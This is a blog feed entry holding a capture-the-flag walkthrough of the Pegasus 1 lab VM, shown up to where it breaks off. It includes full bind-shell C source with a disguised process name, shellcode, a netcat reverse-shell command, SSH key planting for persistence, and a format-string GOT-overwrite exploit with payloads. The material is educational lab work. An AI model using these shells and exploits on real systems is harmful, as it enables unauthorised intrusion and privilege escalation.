<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: ctf | #!/slash/note]]></title>
  <link href="http://leonjza.github.io/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://leonjza.github.io/"/>
  <updated>2014-12-23T15:15:00+02:00</updated>
  <id>http://leonjza.github.io/</id>
  <author>
    <name><![CDATA[Leon Jacobs]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[hoof to root ? - solving pegasus 1]]></title>
    <link href="http://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1/"/>
    <updated>2014-12-23T08:29:49+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/12/23/hoof-to-root-solving-pegasus-1</id>
    <content type="html"><![CDATA[<h2>introduction</h2>

<p><a href="https://www.vulnhub.com/entry/pegasus-1,109/">Pegasus 1</a> is a boot2root hosted on <a href="https://www.vulnhub.com/">VulnHub</a> built by <a href="https://twitter.com/theknapsy">@TheKnapsy</a>. He wrote a <a href="http://knapsy.github.io/blog/2014/12/16/pegasus-has-arrived-my-first-boot2root-vm/">blogpost</a> about it too containing a small introduction with Pegasus as he’s first boot2root (hoof2root? ;p).</p>

<p><img class="right <a" src="href="https://i.imgur.com/PI4O7Dp.png">https://i.imgur.com/PI4O7Dp.png</a>"> Having recently played in the <a href="https://leonjza.github.io/blog/2014/12/06/playing-in-the-playground-a-offsec-virtual-pentesting-labs-review/">Offsec Playground</a> a little after having completed my OSCP, I was relatively exhausted. Pegasus had its fair share of frustrations and had me digging around quite a bit. I did however learn a very valuable lesson&hellip; <em>again</em>. You will see this in the <strong>my_first</strong> section.</p>

<p>Like many other write ups I do, I will also recommend you try this one first before you read on. For me, Pegasus was definitely slightly more difficult than the usual VulnHub stuff you would see, but part of that may just as well be due to fatigue and that year end holiday mode ;p. However, that should not discourage you to give it a bash anyways!</p>

<p>Lets begin.</p>

<!-- more -->


<h2>nmap, again</h2>

<p>Starting a VM like this, you should almost have a knee-jerk reaction to reach for nmap as your first tool to use. A VM, hosted on the network, means you will probably be attacking this one&hellip; via the network. So after figuring out what the IP address is (via arp, netdiscover etc.), I threw nmap at it:</p>

<p>```bash
root@kali:~# nmap &mdash;reason -sV 192.168.56.101 -p-</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-12-23 09:16 SAST
Nmap scan report for 192.168.56.101
Host is up, received arp-response (0.00022s latency).
Not shown: 65531 closed ports
Reason: 65531 resets
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
8088/tcp  open  http    syn-ack nginx 1.1.19
55625/tcp open  status  syn-ack 1 (RPC #100024)
MAC Address: 08:00:27:88:F8:40 (Cadmus Computer Systems)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>

<p>Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
Nmap done: 1 IP address (1 host up) scanned in 16.37 seconds
```</p>

<p><code>tcp/22</code>, <code>tcp/111</code>, <code>tcp/8088</code> and <code>tcp/55625</code>. Thats quite a bit to work with already. I decided to dive right into the web server that appears to be running on <code>tcp/8088</code>.</p>

<h2>stomping some hoofs with pegasus</h2>

<p>Browsing to <a href="http://192.168.56.101:8088/,">http://192.168.56.101:8088/,</a> we are presented with a picture of Pegasus:</p>

<p><img class="<a" src="href="https://i.imgur.com/Z0XYRY8.jpg">https://i.imgur.com/Z0XYRY8.jpg</a>"></p>

<p>I manually tried to browse to things like <code>robots.txt</code> etc, but everything responded with the same image. This was until I decided to browse to <code>index.php</code>, in an attempt to check that the web server is configured to serve PHP content:</p>

<p><img class="<a" src="href="https://i.imgur.com/svwUN3m.png">https://i.imgur.com/svwUN3m.png</a>"></p>

<p>So this doesn’t exactly tell us PHP is supported yet, but it does get us somewhere if we wanted to brute force the web server in search of content. Inspecting the headers of the HTTP responses thus far, we would see that everything would return HTTP 200, however, <code>.php</code> scripts would 404 correctly. With that in mind, it was time to reach for <code>wfuzz</code> to discover some more.</p>

<p>```bash
root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  &mdash;hc 404 <a href="http://192.168.56.101:8088/FUZZ.php">http://192.168.56.101:8088/FUZZ.php</a></p>

<hr />

<ul>
<li>Wfuzz  2.0 &ndash; The Web Bruteforcer                     *</li>
</ul>


<hr />

<p>Target: <a href="http://192.168.56.101:8088/FUZZ.php">http://192.168.56.101:8088/FUZZ.php</a>
Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt</p>

<h1>Total requests: 1660</h1>

<h1>ID  Response   Lines      Word         Chars          Request    </h1>

<p>01426:  C=200      0 L         4 W       19 Ch    &ldquo; &ndash; submit&rdquo;
```</p>

<p>And we have a HTTP 200 response for <code>submit.php</code>. So, I browsed to <a href="http://192.168.56.101:8088/submit.php:">http://192.168.56.101:8088/submit.php:</a></p>

<p><img class="<a" src="href="https://i.imgur.com/Ld1KzkR.png">https://i.imgur.com/Ld1KzkR.png</a>"></p>

<p>Well that isn&rsquo;t exactly useful. I played a little with the <code>submit.php</code> by sending a POST with some <code>--data</code>, but nothing useful came of it. Almost everything came back with <code>No data to process</code>.</p>

<p>Admittedly, this was my first hurdle. I was thinking if there is a <code>submit.php</code>, surely there is something that actually submits the appropriate data to it? So I pulled out some more wordlists and fed them to wfuzz to work on. I&rsquo;ll be honest, I did not like this part much. The wordlists were just too big and it almost felt like this is probably not the way to go about this. <code>wfuzz</code> was working with <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>, when finally I get a HTTP 200 for <code>codereview.php</code>.</p>

<p><img class="<a" src="href="https://i.imgur.com/wYpHVWE.png">https://i.imgur.com/wYpHVWE.png</a>"></p>

<h2>pwning mike</h2>

<p>So mike is apparently a trainee code reviewer. We have a form where we can submit code for him to check out. This is the form that submits the POST data <code>code</code> to the previously found <code>submit.php</code>.</p>

<p>Ok. Well this is a interesting one. My initial thoughts were that if Mike was checking out code, he is possibly executing it? There was however no hint on what language he is expecting, so the wild goose chase began.</p>

<p>PHP, Python, Perl, Ruby, Bash. Name them. I tried them all. Ok maybe not all, especially not brainfk. :D However, in all of them, I tried to get the language to execute <code>/bin/nc 192.168.56.102 4444 -e /bin/sh</code> or variants thereof so that it would connect to my netcat listener on my Kali machine, and spawn me a shell.</p>

<p>Eventually, I came to try some C. Admittedly, I was starting to rethink my strategy by now. That was until my C source had a call to <code>system()</code> in it:</p>

<p><img class="<a" src="href="https://i.imgur.com/IVmBaAA.png">https://i.imgur.com/IVmBaAA.png</a>"></p>

<p>Ooooooh. Ok so that was a very obvious hint that I was getting closer. For me, this boiled down to it either accepting PHP due to <a href="http://php.net/manual/en/function.system.php">system</a>, or C due to its <a href="http://linux.die.net/man/3/system">system</a>. Obviously though, <code>system()</code> is being filtered out, so I would need an alternative.</p>

<p><em>insert fade to black</em></p>

<p><em>CAPTION: many hours later</em></p>

<p>After exhausting my PHP attempts, it was time to move to C. My first attempt was was something along the lines of</p>

<p>```c</p>

<h1>include&lt;stdio.h></h1>

<p>// msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c
unsigned char buf[] =
&ldquo;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80&rdquo;
&ldquo;\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a&rdquo;
&ldquo;\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0&rdquo;
&ldquo;\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f&rdquo;
&ldquo;\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0&rdquo;
&ldquo;\x0b\xcd\x80&rdquo;;</p>

<p>int main()
{</p>

<pre><code>int (*ret)() = (int(*)())buf;
ret();
</code></pre>

<p>}
```</p>

<p>This was supposed to open me a <code>tcp/4444</code> shell, but to no avail. Infact, no shellcode related execution appeared to do anything. As a last resort before I figured I&rsquo;d need to get me some hints, I searched for some non-shellcode type bind shell generation C source. Unfortunately, I don’t write C socket software out of my head, but luckily Google came to the rescue and landed me on <a href="http://bigpointyteeth.se/code/bindshell.c">this</a>. I modified the code slightly by hardcoding my desired port and shell, and submitted it to be &lsquo;reviewed&rsquo;:</p>

<p>```c
// Source: <a href="http://webcache.googleusercontent.com/search?q=cache:52EC4LfMJX4J:bigpointyteeth.se/code/bindshell.c+&amp;cd=11&amp;hl=en&amp;ct=clnk&amp;gl=za">http://webcache.googleusercontent.com/search?q=cache:52EC4LfMJX4J:bigpointyteeth.se/code/bindshell.c+&amp;cd=11&amp;hl=en&amp;ct=clnk&amp;gl=za</a>
// <a href="http://bigpointyteeth.se/code/bindshell.c">http://bigpointyteeth.se/code/bindshell.c</a></p>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;sys/socket.h></h1>

<h1>include &lt;arpa/inet.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>define SHELL &ldquo;/bin/sh&rdquo;   // shell to execute</h1>

<h1>define NAME &ldquo;rsync&rdquo;        // name of the forked bindshell shown in ps</h1>

<p>int main(int argc, char *argv[]) {</p>

<pre><code>char msg[16];
int srv_sockfd, new_sockfd;
socklen_t new_addrlen;
struct sockaddr_in srv_addr, new_addr;

// fork into background
if (fork() == 0) {
    if ((srv_sockfd = socket(PF_INET, SOCK_STREAM, 0)) &lt; 0) {
        return -1;
    }

    srv_addr.sin_family = PF_INET;
    srv_addr.sin_port = htons(atoi("4444"));
    srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(srv_sockfd, (struct sockaddr *)&amp;srv_addr, sizeof(srv_addr)) &lt; 0) {
        return -1;
    }

    if (listen(srv_sockfd, 1) &lt; 0) {
        return -1;
    }

    // accept loop
    for (;;) {
        new_addrlen = sizeof(new_addr);
        new_sockfd = accept(srv_sockfd, (struct sockaddr *)&amp;new_addr, &amp;new_addrlen);
        if (new_sockfd &lt; 0) {
            return -1;
        }

        // fork to handle new connection
        if (fork() == 0) {
            // close old listener
            close(srv_sockfd);
            // print the parent pid which should be killed in order
            // to remove the persistant bindshell listener
            sprintf(msg, "ppid=%d\n", getppid());
            write(new_sockfd, msg, strlen(msg));

            dup2(new_sockfd, 2);
            dup2(new_sockfd, 1);
            dup2(new_sockfd, 0);

            execl(SHELL, NAME, NULL);
            return 0;
        }
        else
            close(new_sockfd);
    } // end accept loop
} // end fork into background
return 0;
</code></pre>

<p>}
```</p>

<p>All of my attempts were followed by a nmap on <code>tcp/4444</code> to see if the shell has become available. After submitting the above code, we got a new port open (this Mike guy is pretty fast you should hire him!):</p>

<p>```bash
root@kali:~# nmap 192.168.56.101 -p 4444</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-12-23 11:33 SAST
Nmap scan report for 192.168.56.101
Host is up (0.00034s latency).
PORT     STATE SERVICE
4444/tcp open  krb524
MAC Address: 08:00:27:88:F8:40 (Cadmus Computer Systems)</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
```</p>

<p>Awesome, so lets connect and see what we have:</p>

<p><code>bash
root@kali:~# nc -v 192.168.56.101 4444
192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out
(UNKNOWN) [192.168.56.101] 4444 (?) open
ppid=10450
id
uid=1001(mike) gid=1001(mike) groups=1001(mike)
</code></p>

<p>As was hoped for, a shell as <code>mike</code>. I quickly generated a new ssh key pair for Pegasus, and cat the public key to <code>mike</code>&rsquo;s <code>authorized_keys</code> file and went on to SSH in as mike:</p>

<p>```bash</p>

<h1>first I cat the public key so that I can copy it</h1>

<p>root@kali:~# cat pegasus.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R root@kali</p>

<h1>next I connect to the bind shell listener and move to Mikes .shh directory</h1>

<p>root@kali:~# nc -v 192.168.56.101 4444
192.168.56.101: inverse host lookup failed: Unknown server error : Connection timed out
(UNKNOWN) [192.168.56.101] 4444 (?) open
ppid=10450
cd .ssh</p>

<h1>next we append my public key to mikes authorized_keys</h1>

<p>echo &ldquo;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNmUef7CT1sDk5YxLor/LVA9FHii/Aagxl86CtRNj24t+TA23K3/KwlfCabCRNwNBXbTWkUmYdNMAEvsv5nbPHhgqZRlmEBzltcmltatmfbhrGmND7cBQGOxZPlcsks0FThEJhNL5z5WS3PpyzA5GUKyn4cPFbXe88uz1SpeXaIC+8kJ5T+jOKu40nLF0iglBtiADQ1rOLMh2pFEZjQhVyE4ieqK7hyBrLlVyQY1bOUGdrguWcEJZUvWDRsa0VCOIXOdNeg3AsXPG/1KbIzubOfjieaTgs9Mhqg7C9vdL21dia48B5NRKl7GoS6xJx09tmXVvYMAt+Sut6OwBUTV+R&rdquo; >> authorized_keys
ls -lh
total 12K
-rw-rw-r&mdash; 1 mike mike  381 Dec 23 20:36 authorized_keys
-rw&mdash;&mdash;&mdash;&ndash; 1 mike mike 1.7K Nov 18 12:39 id_rsa
-rw-r&mdash;r&mdash; 1 mike mike  222 Nov 18 17:39 known_hosts
chmod 600 authorized_keys
^C</p>

<h1>with the authorized_keys ready, I SSH in as mike using my key pair</h1>

<p>root@kali:~# ssh <a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#109;&#x69;&#x6b;&#101;&#64;&#49;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#46;&#x35;&#54;&#46;&#49;&#48;&#49;">&#x6d;&#x69;&#x6b;&#101;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#x2e;&#53;&#54;&#46;&#49;&#48;&#x31;</a> -i pegasus
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-39-generic i686)</p>

<ul>
<li>Documentation:  <a href="https://help.ubuntu.com/">https://help.ubuntu.com/</a></li>
</ul>


<p>  System information as of Tue Dec 23 20:36:47 AEDT 2014</p>

<p>  System load:  0.0               Processes:           93
  Usage of /:   6.8% of 18.32GB   Users logged in:     0
  Memory usage: 12%               IP address for eth0: 192.168.56.101
  Swap usage:   0%</p>

<p>  => There are 2 zombie processes.</p>

<p>  Graph this data and manage this system at:</p>

<pre><code>https://landscape.canonical.com/
</code></pre>

<p>Your Hardware Enablement Stack (HWE) is supported until April 2017.</p>

<p>You have mail.
Last login: Tue Dec 16 19:27:53 2014 from 172.16.246.129
mike@pegasus:~$
```</p>

<h2>my_first, your_first, we_all_first</h2>

<p>With my initial shell I was able to start enumerating Pegasus a little more. The most obvious next step was the SUID binary in <code>mike</code>&rsquo;s home (we will get to it shortly):</p>

<p><code>bash
mike@pegasus:~$ ls -lh
total 16K
-rwxr-xr-x 1 mike mike  845 Nov 18 20:52 check_code.sh
drwx------ 2 mike mike 4.0K Nov 18 17:49 Mail
-rwsr-xr-x 1 john john 6.5K Nov 28 10:26 my_first
</code></p>

<p>More enumeration revealed that <code>/opt/</code> had a number of interesting parts to it as well:</p>

<p><code>bash
mike@pegasus:~$ ls -lh /opt/
total 12K
drwxrwxrwx 2 root root 4.0K Dec 23 20:33 code_review
drwxr-xr-x 3 root root 4.0K Nov 25 04:38 git
drwxr-xr-x 2 root root 4.0K Nov 18 14:43 nfs
</code></p>

<p>Piecing the web interface together, you will see that the submitted source is put into <code>code.c</code> in <code>/opt/code_review/</code>, and then compiled from the script in <code>/home/mike/check_code.sh</code> and eventually executed.</p>

<p>The <code>/opt/git/</code> folder had what looked like remnants of the typical <code>.git/</code> folders when you checkout code from a repo, but not the actual files itself. I poked around a bit, and was able to re-assemble the <code>main.c</code> file from the git history.</p>

<h3>rebuilding main.c</h3>

<p><em>This step is not essential in progressing with Pegasus, but I figured it would be an interesting approach nonetheless</em></p>

<p>Even though the git folder did not appear to have any actual source files, one could quickly learn what it contains. For example, the git log will show you the commit history:</p>

<p>```bash
mike@pegasus:/opt/git/my_first.git$ git log
commit 85365946a8142c52ee6040a029dd069b514c2ab0
Author: Mike Ross &lt;mike@pegasus.(none)>
Date:   Tue Nov 25 04:48:01 2014 +1100</p>

<pre><code>Committing some security fixes
</code></pre>

<p>commit 0a8af1ed956518ec078b152ad7571105e2df26c6
Author: John Wall &lt;john@pegasus.(none)>
Date:   Tue Nov 25 04:39:42 2014 +1100</p>

<pre><code>initial commit
</code></pre>

<p>```</p>

<p>From the log we can see that there as an initial commit, and one more after that with some <em>security fixes</em>. Chances are, if we can see what the initial commit was then we can see the full initial code. So, lets check out the details of commit <em>0a8af1ed</em>:</p>

<p>```diff
mike@pegasus:/opt/git/my_first.git$ git show 0a8af1ed
commit 0a8af1ed956518ec078b152ad7571105e2df26c6
Author: John Wall &lt;john@pegasus.(none)>
Date:   Tue Nov 25 04:39:42 2014 +1100</p>

<pre><code>initial commit
</code></pre>

<p>diff &mdash;git a/main.c b/main.c
new file mode 100644
index 0000000..39c0182
&mdash;&ndash; /dev/null
+++ b/main.c
@@ -0,0 +1,133 @@
+#include &lt;stdio.h>
+#include &lt;stdlib.h>
+
+int calculator();
+int string_replay();
+int string_reverse();
+int quit();
+
+int main()
+{
+    char selection[5];
+    int sel;
+    char * err_check;</p>

<p>[&hellip; snip &hellip;]
```</p>

<p>Nice! We have a file <code>main.c</code> that was added. I copied the diff and saved it to <code>init.patch</code>, and then ran the patch:</p>

<p><code>bash
root@kali:~# patch -p1 &lt; init.diff
patching file main.c
</code></p>

<p>That gives us the state of files after commit <em>0a8af1ed</em> which was labeled as the initial commit. The same process was followed for the next commit <em>85365946a8</em> which apparently included some <em>security fixes</em>. Copy the diff, make the .patch file and apply it. After this process, we have the sources up to where the git commit history has it.</p>

<p>I inspected that code before and after the security fixes commit, and noticed that the security fixes fixed a potential format string vulnerability. At least, that was the one my untrained eye was able to spot:</p>

<p>```diff
diff &mdash;git a/main.c b/main.c
index 39c0182..b6b2ed4 100644
&mdash;&ndash; a/main.c
+++ b/main.c
@@ -8,7 +8,7 @@ int quit();</p>

<p>[&hellip; snip &hellip;]
+</p>

<pre><code>     printf("Enter second number: ");
     if (fgets(numberB, sizeof numberB, stdin) != NULL)
     {
</code></pre>

<ul>
<li><pre><code>     int numA = strtol(numberA, &amp;err_check, 10);
     int numB = strtol(numberB, &amp;err_check, 10); 
     if (*err_check != '\n')
     {
</code></pre></li>
<li><pre><code>         printf("Error details: ");
</code></pre></li>
<li><pre><code>         printf(err_check);
</code></pre></li>
<li><pre><code>         printf("Error details: %s", err_check);
         printf("\n");
         return 1;
</code></pre>

<p>[&hellip; snip &hellip;]
```</p></li>
</ul>


<p><code>printf(err_check);</code> is the potentially vulnerable call&hellip; I think.</p>

<h3>the calculator with a hole</h3>

<p>After toying with the git repository, my attention turned back to the SUID binary. When I run <code>my_first</code>, I am actually running it as <code>john</code>. This means, should I be able to exploit it and do things other than what its intended for, I may affectively gain <code>john</code>&rsquo;s privileges! Sounds easy right. :P</p>

<p>I quickly realized that the <code>main.c</code> file I got out of the git repository, was the sources for the <code>my_first</code> binary. So, my focus shifted to the piece of code I saw the security fix for.</p>

<p>First, it was time to confirm my suspicion of a format string vulnerability:</p>

<p>```bash
mike@pegasus:~$ ./my_first</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit</p>

<p>Selection: 1</p>

<p>Enter first number: 1
Enter second number: %x  <br/>
Error details: bf96cbec</p>

<p>Selection:
```</p>

<p><img class="<a" src="href="https://i.imgur.com/xrrpxFZ.png">https://i.imgur.com/xrrpxFZ.png</a>"></p>

<p>I don’t like format string vulnerabilities. In fact not at all. I was hoping for something else and at this stage, I was happy I found the bug (which was the code before the security fixes btw), but sad that its a format string.</p>

<p>Anyways, feels aside, it was time to work on a exploit.</p>

<p>For the format string exploit, I don&rsquo;t think its really worth explaining all the details again. In fact, compiling this exploit, I was referring to a older blogpost about <a href="https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/">Xerxes2</a> which also had a similar thing going. Feel free to check the binary section out there if the next part does not make much sense.</p>

<h3>punching more than numbers</h3>

<p><em>So here, I had a pretty big freaking fail. A massive one. Once I had determined the stack position to start corrupting memory with, I was punching in the format strings in the application itself. Meaning, I was giving it the ASCII \x\x\x\x and not the actual bytes as would have been the case if I was using python/printf to redirect the stdout of them to <code>my_first</code>&rsquo;s stdin. Anyways, lessons were learnt, caffeine was injected. It wont happen again. Big up to <a href="https://twitter.com/barrebas">@barrebas</a> for subtly pointing the fail out ;p</em></p>

<p>As I had seen the source code, it was easy to formulate a plan for the exploit. I would make use of a ret2libc attack by overriding the GOT entry for <code>printf()</code> using the format string to <code>system()</code> instead. This means, the next time <code>printf()</code> is called, it would actually execute <code>system()</code> with the adjacent argument on the stack. Lets see how this was done.</p>

<h4>compiling the format string</h4>

<p>We know that the 2nd number that the applications wants triggers our format string. So, lets prepare some skeleton input, piping it to the <code>./my_first</code> binary to sample a successful run:</p>

<p>```bash
mike@pegasus:~$ printf &lsquo;1\n1\n1\n4\n&rsquo; | ./my_first</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit</p>

<p>Selection:
Enter first number: Enter second number: Result: 1 + 1 = 2</p>

<p>Selection:
Goodbye!
```</p>

<p>Cool, so we have sampled adding 1 to 1 ;p Now we can get to exploiting the format string. The first step we have is to determine which parameter on the stack we have control of. We determine this by providing it with a string of 4 A&rsquo;s, and then incrementing the format string arguments by 1 until we can find the 4 A&rsquo;s. In my case, I will be formatting them as hex with <code>%x</code>, so I am searching for <code>41414141</code>. The format string will therefore start as <code>AAAA.0x%s</code>. Note that in the below example we are using 2 x percentages (2 x &lsquo;%&rsquo;) as it needs to be escaped in the shell:</p>

<p>```bash
mike@pegasus:~$ printf &lsquo;1\n1\nAAAA.0x%%x\n4\n&rsquo; | ./my_first</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit</p>

<p>Selection:
Enter first number: Enter second number: Error details: AAAA.0xbff5321c</p>

<p>Selection:
Goodbye!
```</p>

<p>And we have the output of <code>AAAA.0xbff5321c</code>. Yay :)
Continuously incrementing this will eventually get you to argument 8, where you will find the clean string of hex A&rsquo;s:</p>

<p>```bash
mike@pegasus:~$ printf &lsquo;1\n1\nAAAA.0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x0x%%x\n4\n&rsquo; | ./my_first</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit</p>

<p>Selection:
Enter first number: Enter second number: Error details: AAAA.0xbfbd145c0xa0xb75b41600xb7726ac00xb7752ff40xb77539180xbfbd14600x41414141</p>

<p>Selection:
Goodbye!
mike@pegasus:~$
```</p>

<p>So, using direct parameter access in the format string, we can reference parameter 8 directly:</p>

<p>```bash
mike@pegasus:~$ printf &lsquo;1\n1\nAAAA.0x%%8$x\n4\n&rsquo; | ./my_first</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit</p>

<p>Selection:
Enter first number: Enter second number: Error details: AAAA.0x41414141</p>

<p>Selection:
Goodbye!
mike@pegasus:~$
```</p>

<p>Parameter 8 in the format string is the start of the section on the stack we can read now, shown in the output <code>AAAA.0x41414141</code> of the format string <code>AAAA.0x%8$x</code>.</p>

<p>Now we will move on to making use of the <code>%n</code> format string to write to a arbitrary area in memory. Where do we want to write? To the GOT where the lookup for <code>printf()</code> occurs ofc! Lets dump the GOT for <code>./my_first</code>, and determine where it will go look for <code>printf()</code>:</p>

<p>```bash
mike@pegasus:~$ objdump -R ./my_first</p>

<p>./my_first:     file format elf32-i386</p>

<p>DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049bec R_386_GLOB_DAT    <strong>gmon_start</strong>
08049c20 R_386_COPY        stdin
08049bfc R_386_JUMP_SLOT   printf
08049c00 R_386_JUMP_SLOT   fgets
08049c04 R_386_JUMP_SLOT   puts
08049c08 R_386_JUMP_SLOT   <strong>gmon_start</strong>
08049c0c R_386_JUMP_SLOT   __libc_start_main
08049c10 R_386_JUMP_SLOT   putchar
08049c14 R_386_JUMP_SLOT   strtol
```</p>

<p>The location of <code>printf()</code> will be looked up at <code>08049bfc</code>. This is the part where we want to rewrite the address of <code>printf()</code> to that of libc&rsquo;s <code>system()</code>.</p>

<p>The last part we need is to know where <code>system()</code> actually is. An important vector that may influence this position in memory is known as ASLR, which will effectively cause the address of <code>system()</code> to be different every time <code>./my_first</code> is run. To combat this, a neat little trick to increase the stack size can be used using <code>ulimit</code>. <code>ulimit -s unlimited</code> will maximize the stack size, effectively causing the ASLR to be practically nonexistent:</p>

<p><code>bash
mike@pegasus:~$ ulimit -s
8192
mike@pegasus:~$ ulimit -s unlimited
mike@pegasus:~$ ulimit -s
unlimited
</code></p>

<p>With the ASLR problem out of the way, lets leak the address of <code>system()</code>:</p>

<p>```bash</p>

<h1>fire up gdb</h1>

<p>mike@pegasus:~$ gdb -q ./my_first
Reading symbols from /home/mike/my_first&hellip;(no debugging symbols found)&hellip;done.</p>

<h1>set a break point as we enter main()</h1>

<p>(gdb) b main
Breakpoint 1 at 0x804850f</p>

<h1>run the binary</h1>

<p>(gdb) r
Starting program: /home/mike/my_first</p>

<p>Breakpoint 1, 0x0804850f in main ()</p>

<h1>leak the current address of system()</h1>

<p>(gdb) p system
$1 = {<text variable, no debug info>} 0x40069060 <system>
(gdb)
```</p>

<p>And so we learn that <code>system()</code> lives at <code>0x40069060</code>. What does this all mean so far then? Well, we are now going to use the format string vulnerability to write (using <code>%n</code>) a new address for <code>printf()</code> in the GOT at <code>08049bfc</code> to point to <code>system()</code> at <code>0x40069060</code> instead of its real location.</p>

<p>For us to debug the application while we prepare the required padding for the format string, we will use the <code>printf()</code> used to pipe to <code>./my_first</code> to redirect to a file instead. Then, in <code>gdb</code>, we will run the binary, redirecting the input from the file we will compile with the <code>printf()</code>:</p>

<p>```bash</p>

<h1>so, instead of the 4 x A&rsquo;s, we will now place the address</h1>

<h1>in the GOT that we want to override, and use the %x format</h1>

<h1>string to attempt writing to it</h1>

<p>mike@pegasus:~$ printf &lsquo;1\n1\n\xfc\x9b\x04\x08%%8$n&rsquo; > t
mike@pegasus:~$ file t
t: data</p>

<h1>then, in gdb, we will grab the output of the new file called</h1>

<h1>t, and redirect it as input to my_first</h1>

<p>mike@pegasus:~$ gdb -q ./my_first
Reading symbols from /home/mike/my_first&hellip;(no debugging symbols found)&hellip;done.</p>

<h1>leak the current address that GOT points to for printf()</h1>

<p>(gdb) x/x 0x08049bfc
0x8049bfc <a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#112;&#x72;&#105;&#110;&#x74;&#102;&#x40;&#x67;&#111;&#116;&#x2e;&#x70;&#x6c;&#x74;">&#112;&#114;&#105;&#110;&#116;&#102;&#64;&#103;&#111;&#x74;&#46;&#x70;&#108;&#116;</a>: 0x080483b6</p>

<h1>run the binary with our exploit (t) as input</h1>

<p>(gdb) r &lt; t
Starting program: /home/mike/my_first &lt; t</p>

<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>

<p>Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit</p>

<p>Selection:
Enter first number: Enter second number: Error details: ��</p>

<p>Program received signal SIGSEGV, Segmentation fault.
0x00000004 in ?? ()</p>

<h1>inspect the new address the GOT points to for printf()</h1>

<p>(gdb) x/x 0x08049bfc
0x8049bfc <a href="&#109;&#x61;&#105;&#108;&#x74;&#x6f;&#x3a;&#112;&#x72;&#105;&#x6e;&#x74;&#102;&#64;&#103;&#111;&#x74;&#x2e;&#112;&#x6c;&#x74;">&#112;&#x72;&#x69;&#110;&#116;&#102;&#64;&#x67;&#x6f;&#116;&#x2e;&#112;&#x6c;&#116;</a>: 0x00000004
(gdb)
```</p>

<p>This is working exactly as expected. Now all that is left is to pad the format string so that we can have the address <code>0x40069060</code> instead of <code>0x00000004</code> written. For the math etc involved, refer to the Xerxes2 post I previously mentioned. The resultant format string was <code>\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n</code>, with a run in the debugger ending in:</p>

<p>```bash</p>

<h1>prep the input file</h1>

<p>mike@pegasus:~$ printf &lsquo;1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&rsquo; > t
mike@pegasus:~$</p>

<h1>run it in the debugger</h1>

